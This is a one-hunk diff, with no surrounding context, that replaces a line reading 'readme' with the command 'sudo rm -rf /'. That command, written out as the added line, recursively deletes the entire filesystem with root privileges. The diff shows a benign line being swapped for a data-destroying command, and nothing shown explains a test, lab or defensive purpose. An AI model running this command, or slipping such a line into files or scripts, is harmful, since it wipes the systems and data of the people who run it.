@@ -1,1 +1,1 @@
-readme
+sudo rm -rf /
